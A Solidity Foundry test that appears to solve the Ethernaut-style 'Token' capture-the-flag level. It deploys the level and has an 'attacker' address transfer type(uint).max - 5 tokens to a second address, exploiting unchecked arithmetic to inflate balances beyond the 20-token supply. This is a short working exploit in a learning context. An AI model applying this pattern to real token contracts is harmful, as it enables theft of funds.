// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint balance);
}

interface ITokenFactory {
    function createInstance(address _player) external payable returns (address);

    function validateInstance(
        address payable _instance,
        address _player
    ) external returns (bool);
}

contract TokenTest is Test {
    uint constant playerSupply = 20;
    IToken private token;
    ITokenFactory private tokenFactory;
    address private attacker = makeAddr("attacker");

    function setUp() external {
        bytes memory bytecode = abi.encodePacked(
            vm.getCode("TokenFactory.sol")
        );
        address tokenFactoryAddress;
        assembly {
            tokenFactoryAddress := create(
                0,
                add(bytecode, 0x20),
                mload(bytecode)
            )
        }
        tokenFactory = ITokenFactory(tokenFactoryAddress);
        token = IToken(tokenFactory.createInstance(attacker));
    }

    function testTokenHack() external {
        vm.startPrank(attacker);
        address attacker2 = makeAddr("attacker2");
        token.transfer(attacker2, type(uint).max - 5);
        uint256 attacker2Balance = token.balanceOf(attacker2);
        assertGt(attacker2Balance, playerSupply, "Test Failed!");
        tokenFactory.validateInstance(payable(address(token)), attacker);
        vm.stopPrank();
    }
}
